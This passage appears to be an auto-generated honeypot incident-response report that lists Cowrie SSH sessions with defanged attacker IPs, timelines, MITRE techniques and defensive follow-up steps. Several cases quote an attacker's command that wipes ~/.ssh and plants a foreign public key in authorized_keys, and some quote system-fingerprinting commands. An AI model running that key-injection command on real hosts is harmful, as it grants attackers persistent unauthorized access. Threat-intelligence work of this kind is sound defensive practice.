| `2026-10-10 03:58:57` | `cowrie.client.kex` |
| `2026-10-10 03:58:58` | `cowrie.login.success` |
| `2026-10-10 03:59:00` | `cowrie.session.params` |
| `2026-10-10 03:59:00` | `cowrie.command.input` |
| `2026-10-10 03:59:00` | `cowrie.command.failed` |
| `2026-10-10 03:59:00` | `cowrie.log.closed` |
| `2026-10-10 03:59:01` | `cowrie.session.params` |
| `2026-10-10 03:59:01` | `cowrie.command.input` |
| `2026-10-10 03:59:02` | `cowrie.session.file_download` |
| `2026-10-10 03:59:02` | `cowrie.log.closed` |
| `2026-10-10 03:59:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.98.176[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.98.176[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475fcb1aca92

| Field | Detail |
|---|---|
| **Source IP** | `103.98.176[.]164` |
| **First Seen** | 2026-10-10 03:59 |
| **Last Seen** | 2026-10-10 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:59:02` | `cowrie.session.connect` |
| `2026-10-10 03:59:02` | `cowrie.client.version` |
| `2026-10-10 03:59:02` | `cowrie.client.kex` |
| `2026-10-10 03:59:03` | `cowrie.login.success` |
| `2026-10-10 03:59:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.98.176[.]164` to AbuseIPDB if not already reported
- [ ] Block `103.98.176[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2b7a1b0d85b

| Field | Detail |
|---|---|
| **Source IP** | `2.180.32[.]104` |
| **First Seen** | 2026-10-10 03:59 |
| **Last Seen** | 2026-10-10 04:00 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 03:59:59` | `cowrie.session.connect` |
| `2026-10-10 03:59:59` | `cowrie.client.version` |
| `2026-10-10 03:59:59` | `cowrie.client.kex` |
| `2026-10-10 04:00:01` | `cowrie.login.success` |
| `2026-10-10 04:00:03` | `cowrie.session.params` |
| `2026-10-10 04:00:03` | `cowrie.command.input` |
| `2026-10-10 04:00:03` | `cowrie.command.failed` |
| `2026-10-10 04:00:04` | `cowrie.log.closed` |
| `2026-10-10 04:00:06` | `cowrie.session.params` |
| `2026-10-10 04:00:06` | `cowrie.command.input` |
| `2026-10-10 04:00:07` | `cowrie.session.file_download` |
| `2026-10-10 04:00:07` | `cowrie.log.closed` |
| `2026-10-10 04:00:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.180.32[.]104` to AbuseIPDB if not already reported
- [ ] Block `2.180.32[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f9292fe697

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]127` |
| **First Seen** | 2026-10-10 04:00 |
| **Last Seen** | 2026-10-10 04:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:00:05` | `cowrie.session.connect` |
| `2026-10-10 04:00:05` | `cowrie.client.version` |
| `2026-10-10 04:00:05` | `cowrie.client.kex` |
| `2026-10-10 04:00:05` | `cowrie.login.success` |
| `2026-10-10 04:00:07` | `cowrie.session.params` |
| `2026-10-10 04:00:07` | `cowrie.command.input` |
| `2026-10-10 04:00:07` | `cowrie.log.closed` |
| `2026-10-10 04:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]127` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]127` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f74f2e5c6b55

| Field | Detail |
|---|---|
| **Source IP** | `2.180.32[.]104` |
| **First Seen** | 2026-10-10 04:00 |
| **Last Seen** | 2026-10-10 04:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:00:07` | `cowrie.session.connect` |
| `2026-10-10 04:00:07` | `cowrie.client.version` |
| `2026-10-10 04:00:09` | `cowrie.client.kex` |
| `2026-10-10 04:00:15` | `cowrie.login.success` |
| `2026-10-10 04:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.180.32[.]104` to AbuseIPDB if not already reported
- [ ] Block `2.180.32[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32b02f6d7fe

| Field | Detail |
|---|---|
| **Source IP** | `156.239.236[.]204` |
| **First Seen** | 2026-10-10 04:00 |
| **Last Seen** | 2026-10-10 04:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:00:26` | `cowrie.session.connect` |
| `2026-10-10 04:00:26` | `cowrie.client.version` |
| `2026-10-10 04:00:26` | `cowrie.client.kex` |
| `2026-10-10 04:00:27` | `cowrie.login.success` |
| `2026-10-10 04:00:29` | `cowrie.session.params` |
| `2026-10-10 04:00:29` | `cowrie.command.input` |
| `2026-10-10 04:00:29` | `cowrie.command.failed` |
| `2026-10-10 04:00:29` | `cowrie.log.closed` |
| `2026-10-10 04:00:30` | `cowrie.session.params` |
| `2026-10-10 04:00:30` | `cowrie.command.input` |
| `2026-10-10 04:00:30` | `cowrie.session.file_download` |
| `2026-10-10 04:00:30` | `cowrie.log.closed` |
| `2026-10-10 04:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.236[.]204` to AbuseIPDB if not already reported
- [ ] Block `156.239.236[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fbeb02411f3

| Field | Detail |
|---|---|
| **Source IP** | `156.239.236[.]204` |
| **First Seen** | 2026-10-10 04:00 |
| **Last Seen** | 2026-10-10 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:00:30` | `cowrie.session.connect` |
| `2026-10-10 04:00:30` | `cowrie.client.version` |
| `2026-10-10 04:00:31` | `cowrie.client.kex` |
| `2026-10-10 04:00:31` | `cowrie.login.success` |
| `2026-10-10 04:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.236[.]204` to AbuseIPDB if not already reported
- [ ] Block `156.239.236[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa88dd53d8e2

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-10-10 04:05 |
| **Last Seen** | 2026-10-10 04:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:05:22` | `cowrie.session.connect` |
| `2026-10-10 04:05:22` | `cowrie.client.version` |
| `2026-10-10 04:05:22` | `cowrie.client.kex` |
| `2026-10-10 04:05:23` | `cowrie.login.success` |
| `2026-10-10 04:05:25` | `cowrie.session.params` |
| `2026-10-10 04:05:25` | `cowrie.command.input` |
| `2026-10-10 04:05:25` | `cowrie.command.failed` |
| `2026-10-10 04:05:25` | `cowrie.log.closed` |
| `2026-10-10 04:05:26` | `cowrie.session.params` |
| `2026-10-10 04:05:26` | `cowrie.command.input` |
| `2026-10-10 04:05:26` | `cowrie.session.file_download` |
| `2026-10-10 04:05:26` | `cowrie.log.closed` |
| `2026-10-10 04:05:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a75e29c15240

| Field | Detail |
|---|---|
| **Source IP** | `98.70.50[.]166` |
| **First Seen** | 2026-10-10 04:05 |
| **Last Seen** | 2026-10-10 04:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:05:26` | `cowrie.session.connect` |
| `2026-10-10 04:05:26` | `cowrie.client.version` |
| `2026-10-10 04:05:26` | `cowrie.client.kex` |
| `2026-10-10 04:05:27` | `cowrie.login.success` |
| `2026-10-10 04:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.50[.]166` to AbuseIPDB if not already reported
- [ ] Block `98.70.50[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b8d4feee3a5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-10 04:10 |
| **Last Seen** | 2026-10-10 04:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:10:34` | `cowrie.session.connect` |
| `2026-10-10 04:10:34` | `cowrie.client.version` |
| `2026-10-10 04:10:34` | `cowrie.client.kex` |
| `2026-10-10 04:10:34` | `cowrie.login.success` |
| `2026-10-10 04:10:34` | `cowrie.direct-tcpip.request` |
| `2026-10-10 04:10:35` | `cowrie.direct-tcpip.data` |
| `2026-10-10 04:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f565ccaef194

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-10-10 04:13 |
| **Last Seen** | 2026-10-10 04:13 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:13:09` | `cowrie.session.connect` |
| `2026-10-10 04:13:10` | `cowrie.client.version` |
| `2026-10-10 04:13:10` | `cowrie.client.kex` |
| `2026-10-10 04:13:14` | `cowrie.login.success` |
| `2026-10-10 04:13:17` | `cowrie.session.params` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.success` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| `2026-10-10 04:13:17` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e74fb1180201

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-10-10 04:15 |
| **Last Seen** | 2026-10-10 04:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:15:43` | `cowrie.session.connect` |
| `2026-10-10 04:15:43` | `cowrie.client.version` |
| `2026-10-10 04:15:43` | `cowrie.client.kex` |
| `2026-10-10 04:15:44` | `cowrie.login.success` |
| `2026-10-10 04:15:46` | `cowrie.session.params` |
| `2026-10-10 04:15:46` | `cowrie.command.input` |
| `2026-10-10 04:15:46` | `cowrie.command.failed` |
| `2026-10-10 04:15:46` | `cowrie.log.closed` |
| `2026-10-10 04:15:47` | `cowrie.session.params` |
| `2026-10-10 04:15:47` | `cowrie.command.input` |
| `2026-10-10 04:15:47` | `cowrie.session.file_download` |
| `2026-10-10 04:15:47` | `cowrie.log.closed` |
| `2026-10-10 04:15:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2aa8c79eb23

| Field | Detail |
|---|---|
| **Source IP** | `156.245.246[.]50` |
| **First Seen** | 2026-10-10 04:15 |
| **Last Seen** | 2026-10-10 04:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:15:47` | `cowrie.session.connect` |
| `2026-10-10 04:15:47` | `cowrie.client.version` |
| `2026-10-10 04:15:47` | `cowrie.client.kex` |
| `2026-10-10 04:15:48` | `cowrie.login.success` |
| `2026-10-10 04:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.245.246[.]50` to AbuseIPDB if not already reported
- [ ] Block `156.245.246[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c78ebfc44e

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]253` |
| **First Seen** | 2026-10-10 04:17 |
| **Last Seen** | 2026-10-10 04:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-10 04:17:52` | `cowrie.session.connect` |
| `2026-10-10 04:17:52` | `cowrie.client.version` |
| `2026-10-10 04:17:52` | `cowrie.client.kex` |
| `2026-10-10 04:17:53` | `cowrie.login.success` |
| `2026-10-10 04:17:54` | `cowrie.session.params` |
| `2026-10-10 04:17:54` | `cowrie.command.input` |
| `2026-10-10 04:17:54` | `cowrie.command.failed` |
| `2026-10-10 04:17:55` | `cowrie.log.closed` |
| `2026-10-10 04:17:56` | `cowrie.session.params` |
| `2026-10-10 04:17:56` | `cowrie.command.input` |
| `2026-10-10 04:17:56` | `cowrie.session.file_download` |
| `2026-10-10 04:17:56` | `cowrie.log.closed` |
| `2026-10-10 04:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]253` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]253` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (133) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-6c6f902e7c5a | HIGH | `156.239.224[.]253` | 2026-10-10 04:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-20b920093911 | HIGH | `115.190.243[.]73` | 2026-10-10 04:20 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-e36b24c2d9f7 | HIGH | `180.252.224[.]192` | 2026-10-10 04:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cfd7cbedf9b6 | HIGH | `180.252.224[.]192` | 2026-10-10 04:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b5a0e8e96bae | HIGH | `187.16.96[.]250` | 2026-10-10 04:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c4810ef97b25 | HIGH | `187.16.96[.]250` | 2026-10-10 04:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-153020d7f977 | HIGH | `120.48.134[.]186` | 2026-10-10 04:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1d8d6b180182 | HIGH | `120.48.134[.]186` | 2026-10-10 04:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b2977c0251ef | HIGH | `65.49.1[.]24` | 2026-10-10 04:41 | Y | 3 | 0 | `T1078` |
| IR-4ef01e204d45 | HIGH | `109.160.32[.]142` | 2026-10-10 05:15 | Y | 1 | 0 | `T1078 · T1592` |
| IR-bb90d0730e9c | HIGH | `103.144.3[.]181` | 2026-10-10 05:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ebb0d1b559cc | HIGH | `103.144.3[.]181` | 2026-10-10 05:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-eae2200ac705 | HIGH | `81.193.216[.]17` | 2026-10-10 05:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a277001cc680 | HIGH | `81.193.216[.]17` | 2026-10-10 05:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55998a8189bb | HIGH | `120.48.28[.]60` | 2026-10-10 05:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9b6041dc74a9 | HIGH | `120.48.28[.]60` | 2026-10-10 05:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f1ae37f20d88 | HIGH | `103.255.200[.]90` | 2026-10-10 05:42 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-13fcc6d94c61 | HIGH | `102.88.137[.]80` | 2026-10-10 05:44 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fec9f8643f1a | HIGH | `102.88.137[.]80` | 2026-10-10 05:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a9a31b22b032 | HIGH | `4.157.250[.]195` | 2026-10-10 05:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-86b0ca3db955 | HIGH | `4.157.250[.]195` | 2026-10-10 05:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a5403ce0b451 | HIGH | `52.237.80[.]79` | 2026-10-10 05:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5132184eca76 | HIGH | `52.237.80[.]79` | 2026-10-10 05:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2e7d062b9ef5 | HIGH | `148.153.56[.]174` | 2026-10-10 05:49 | Y | 0 | 0 | `T1078` |
| IR-b9533f944afd | HIGH | `172.200.195[.]165` | 2026-10-10 05:51 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-43f5a1cdadc4 | HIGH | `172.200.195[.]165` | 2026-10-10 05:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-03e0259c0cb3 | HIGH | `109.160.32[.]142` | 2026-10-10 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-208bfbca50fa | HIGH | `80.94.92[.]179` | 2026-10-10 06:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-412efd702c42 | HIGH | `176.53.159[.]196` | 2026-10-10 06:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-41168af9a491 | HIGH | `103.255.200[.]90` | 2026-10-10 06:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5bb257f94e38 | HIGH | `106.12.148[.]154` | 2026-10-10 06:41 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-fc88a4e57788 | HIGH | `92.118.39[.]49` | 2026-10-10 07:02 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-c0a77444a69d | HIGH | `103.63.101[.]24` | 2026-10-10 07:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2c84fffc04da | HIGH | `130.12.180[.]51` | 2026-10-10 07:05 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-9eb0b57bcf20 | HIGH | `34.77.82[.]48` | 2026-10-10 07:57 | Y | 2 | 0 | `T1078` |
| IR-a9f8d36b6c51 | HIGH | `34.77.82[.]48` | 2026-10-10 07:57 | Y | 1 | 0 | `T1078` |
| IR-9db873a0f74c | HIGH | `34.77.82[.]48` | 2026-10-10 07:57 | Y | 0 | 0 | `T1078` |
| IR-0a7f48233a30 | HIGH | `92.118.39[.]49` | 2026-10-10 08:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-6152e8ab7fcb | HIGH | `207.175.197[.]92` | 2026-10-10 08:08 | Y | 2 | 0 | `T1078` |
| IR-06e9b1c6ebc6 | HIGH | `207.175.197[.]92` | 2026-10-10 08:08 | Y | 1 | 0 | `T1078` |
| IR-e1a017d79ed2 | HIGH | `207.175.197[.]92` | 2026-10-10 08:08 | Y | 0 | 0 | `T1078` |
| IR-358b6328c489 | HIGH | `176.53.159[.]196` | 2026-10-10 08:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fa9a9146ee41 | HIGH | `168.167.228[.]85` | 2026-10-10 08:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f6b067e619f4 | HIGH | `168.167.228[.]85` | 2026-10-10 08:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2e637e08f745 | HIGH | `34.79.133[.]180` | 2026-10-10 08:30 | Y | 2 | 0 | `T1078` |
| IR-62f080362ee4 | HIGH | `34.79.133[.]180` | 2026-10-10 08:30 | Y | 1 | 0 | `T1078` |
| IR-111b40ec3f43 | HIGH | `34.79.133[.]180` | 2026-10-10 08:30 | Y | 0 | 0 | `T1078` |
| IR-9e743d997cac | HIGH | `129.121.111[.]123` | 2026-10-10 08:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
